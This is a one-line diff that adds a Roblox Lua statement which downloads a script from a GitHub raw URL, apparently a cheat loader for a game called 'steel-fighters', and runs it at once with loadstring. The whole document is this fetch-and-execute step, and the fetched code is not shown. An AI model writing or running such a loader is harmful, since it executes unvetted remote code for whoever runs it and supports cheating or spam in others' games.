@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/steel-fighters-spam3-jkva3bqho4puu3.lua"))()
